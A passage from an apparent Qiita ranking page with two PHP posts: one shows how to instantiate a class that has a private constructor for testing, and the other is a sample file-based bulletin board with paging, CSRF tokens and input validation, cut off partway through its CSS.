<span id="qiita---コンストラクタがprivateなクラスを1行でテスト可能にする" class="fragment"></span><a href="#qiita---%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%81%8Cprivate%E3%81%AA%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%921%E8%A1%8C%E3%81%A7%E3%83%86%E3%82%B9%E3%83%88%E5%8F%AF%E8%83%BD%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/suin/items/a1c3d96050cb7e51424d" id="reference-903ba834860f7434c357">Qiita - コンストラクタがprivateなクラスを1行でテスト可能にする</a>
</h4>

<p>やたらメソッド名が長いですが、要は <strong>コンストラクタをコールせずにインスタンスを生成する</strong> メソッドです。解決策1でやったことで、プロパティをセットすることを除けばこのメソッド1行で代用することが出来ます。また、 <strong>Closure::bind()</strong> は <ins>static なバインドだけでなく、インスタンスに対するバインドも可能</ins>です。つまりバインドするクロージャの中で <strong><code>$this</code></strong> が使えるということです。素晴らしい解決策に思えますが、どちらも <ins>PHP5.4.0以降</ins> でしか使えません。</p>

<p><strong>Closure::bind()</strong> だけで実現できますが、 <strong>class_exists()</strong> で調べて例外処理するのが面倒なので、敢えてどちらも併用するようにして失敗したときの処理は任せています。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">関数定義</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">superNewInstanceArgs</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="p">[])</span> <span class="p">{</span>
    <span class="nv">$object</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$class</span><span class="p">))</span><span class="o">-&gt;</span><span class="na">newInstanceWithoutConstructor</span><span class="p">();</span>
    <span class="nb">call_user_func</span><span class="p">(</span><span class="nx">closure</span><span class="o">::</span><span class="na">bind</span><span class="p">(</span>
        <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$arguments</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">call_user_func_array</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">'__construct'</span><span class="p">],</span> <span class="nv">$arguments</span><span class="p">);</span>
        <span class="p">},</span>
        <span class="nv">$object</span><span class="p">,</span>
        <span class="nv">$object</span>
    <span class="p">));</span>
    <span class="k">return</span> <span class="nv">$object</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テストコード</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span> <span class="o">=</span> <span class="nv">$c</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nx">superNewInstanceArgs</span><span class="p">(</span><span class="s1">'Test'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">]));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="nx">object</span><span class="p">(</span><span class="nx">Test</span><span class="p">)</span> <span class="o">...</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="s2">"a"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"A"</span>
  <span class="p">[</span><span class="s2">"b"</span><span class="o">:</span><span class="k">protected</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"B"</span>
  <span class="p">[</span><span class="s2">"c"</span><span class="o">:</span><span class="s2">"Test"</span><span class="o">:</span><span class="k">private</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"C"</span>
<span class="p">}</span>
</pre></div>
</div>

<p>美しいけどバージョンに縛られるのが非常に残念・・・</p>

<h1>
<span id="結局どうすればいいか" class="fragment"></span><a href="#%E7%B5%90%E5%B1%80%E3%81%A9%E3%81%86%E3%81%99%E3%82%8C%E3%81%B0%E3%81%84%E3%81%84%E3%81%8B"><i class="fa fa-link"></i></a>結局どうすればいいか？</h1>

<h2>
<span id="解決策1" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%961"><i class="fa fa-link"></i></a>解決策1</h2>

<p><strong>PHP5.0.0</strong> とかいうクソ環境でも動く上に、生成される側のクラス自体は汚さないので、個人的には結構好きですね。</p>

<h2>
<span id="解決策2" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%962"><i class="fa fa-link"></i></a>解決策2</h2>

<p><strong>PHP5.3.2</strong> 以降で動くし、まぁいいでしょう。</p>

<h2>
<span id="解決策3" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%963"><i class="fa fa-link"></i></a>解決策3</h2>

<p><strong>PHP5.4.0</strong> 以降しか使わないって決めてる人はこれ1択！！！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />60位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>13</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e7f3f60b687053b7832a">[シリアル版] ページング処理を採り入れた掲示板サンプル</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-17 18:52:32</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[データベース]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="本編" class="fragment"></span><a href="#%E6%9C%AC%E7%B7%A8"><i class="fa fa-link"></i></a>本編</h1>

<h2>
<span id="完成品イメージ" class="fragment"></span><a href="#%E5%AE%8C%E6%88%90%E5%93%81%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>完成品イメージ</h2>

<p><a href="https://camo.qiitausercontent.com/9c263116d8e0e6f64fc20bc05eb28400329d5a85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61393538653539372d306264632d303238642d623936652d3664633737343438386635632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9c263116d8e0e6f64fc20bc05eb28400329d5a85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61393538653539372d306264632d303238642d623936652d3664633737343438386635632e706e67" alt="ss (2013-08-30 at 04.35.47).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/a958e597-0bdc-028d-b96e-6dc774488f5c.png"></a></p>

<h2>
<span id="コード" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>コード</h2>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* 設定 */</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DATA_FILENAME'</span><span class="p">,</span> <span class="s1">'test.log'</span><span class="p">);</span>     <span class="c1">// データファイル</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DISP_MAX'</span><span class="p">,</span>  <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// 1ページの最大表示数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'LIMIT_SEC'</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>                  <span class="c1">// 連続投稿を禁止する秒数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'TOKEN_MAX'</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// ワンタイムトークン蓄積最大数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'SESSION_NAME'</span><span class="p">,</span> <span class="s1">'MiniBoard'</span><span class="p">);</span>     <span class="c1">// セッションクッキーに用いる名前</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'Asia/Tokyo'</span><span class="p">);</span> <span class="c1">// タイムゾーン</span>
<span class="nb">mb_internal_encoding</span><span class="p">(</span><span class="s1">'UTF-8'</span><span class="p">);</span>           <span class="c1">// 内部エンコーディング</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * RuntimeExceptionを生成する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * 例外スタックのメッセージ部分を配列に変換する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* 変数の初期化 */</span>
<span class="c1">// リクエストパラメータをトリミングした後展開</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">,</span> <span class="s1">'page'</span><span class="p">,</span> <span class="s1">'submit'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// ページ番号を1以上の整数になるように補正</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$page</span><span class="p">);</span>

<span class="cm">/* セッションの初期化 */</span>
<span class="nb">session_name</span><span class="p">(</span><span class="nx">SESSION_NAME</span><span class="p">);</span> <span class="c1">// セッション名を設定</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>           <span class="c1">// セッション開始</span>
<span class="c1">// セッション変数を初期化</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SESSION</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
        <span class="s1">'prev'</span>  <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* データファイルに関する処理 */</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="c1">// データファイルを読み書き両用でオープン</span>
    <span class="c1">// (ポインタを先頭にセット, 未作成ならば新規作成)</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nx">DATA_FILENAME</span><span class="p">,</span> <span class="s1">'a+b'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'データファイルのオープンに失敗しました。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// データファイルを共有ロック</span>
    <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_SH</span><span class="p">);</span>
    <span class="c1">// ファイルを読み取ってシリアルからの復元を試みる</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="o">?:</span> <span class="k">array</span><span class="p">();</span>
    <span class="c1">// 送信ボタンが押された場合</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// セッション変数に書き込む情報をセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
            <span class="c1">// ワンタイムトークンが直近指定個に含まれていなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'フォームの有効期限が切れています。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ワンタイムトークンを消費させる</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]);</span>
            <span class="c1">// 最後の投稿から指定秒経過していなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$diff</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">((</span><span class="nv">$limit</span> <span class="o">=</span> <span class="nx">LIMIT_SEC</span> <span class="o">-</span> <span class="nv">$diff</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s2">"投稿間隔が短すぎます。あと</span><span class="si">{</span><span class="nv">$limit</span><span class="si">}</span><span class="s2">秒ほどお待ちください。"</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// 名前をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前は30字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Eメールアドレスをチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'有効なEメールアドレスを入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 本文をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'本文は140字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 例外がここまでに1つでも発生していればスローする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// 排他ロックに切り替える</span>
            <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
            <span class="c1">// 配列の先頭にデータを追加</span>
            <span class="nb">array_unshift</span><span class="p">(</span><span class="nv">$articles</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">,</span>
                <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$email</span><span class="p">,</span>
                <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="nv">$text</span><span class="p">,</span>
                <span class="s1">'time'</span>  <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]),</span>
            <span class="p">));</span>
            <span class="c1">// ファイルを空にする</span>
            <span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="c1">// 編集した配列をシリアル化して上書き</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$articles</span><span class="p">));</span>
            <span class="c1">// セッションに時間を記録し、メッセージをセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
            <span class="c1">// フォームの投稿内容をリセットする</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="c1">// 正しい処理を行ったが、形式上例外としてスロー</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'書き込みました'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// 総件数をセット</span>
    <span class="nv">$whole_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
    <span class="c1">// 総ページ数をセット</span>
    <span class="nv">$page_count</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$whole_count</span> <span class="o">/</span> <span class="nx">DISP_MAX</span><span class="p">);</span>
    <span class="c1">// ページ番号にあった分だけ取り出す</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$articles</span><span class="p">,</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">);</span>
    <span class="c1">// 現在のページの件数をセット</span>
    <span class="nv">$current_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
<span class="c1">// 後始末</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_UN</span><span class="p">);</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* ワンタイムトークンを次の投稿のために準備 */</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">())</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="nx">TOKEN_MAX</span>
<span class="p">);</span>

<span class="cm">/* ヘッダー送信 */</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>ミニ掲示板<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span><span class="p">&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span>
    <span class="o">&lt;!</span><span class="nt">--</span>
    <span class="p">#</span><span class="nn">wrapper</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">container</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">650</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span> <span class="kc">auto</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">messages</span><span class="o">,</span> <span class="p">#</span><span class="nn">textarea</span><span class="o">,</span> <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">550</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">-3</span><span class="kt">px</span> <span class="kc">auto</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">3</span><span class="kt">px</span> <span class="kc">double</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">28</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span> 
      <span class="k">overflow</span><span class="p">:</span> <span class="kc">hidden</span><span class="p">;</span>
      <span class="k">padding-top</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article</span> <span class="p">{</span>
      <span class="k">margin-top</span><span class="p">:</span> <span class="mi">-1</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">dotted</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">19</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_name</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">27</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_text</span> <span class="p">{</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_time</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">page</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">body</span> <span class="p">{</span>
      <span class="k">background</span><span class="p">:</span> <span class="kc">antiquewhite</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">h1</span> <span class="p">{</span>
      <span class="k">color</span><span class="p">:</span> <span class="kc">fuchsia</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">textarea</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
      <span class="k">height</span><span class="p">:</span> <span class="mi">150</span><span class="kt">px</span><span class="p">;</span>
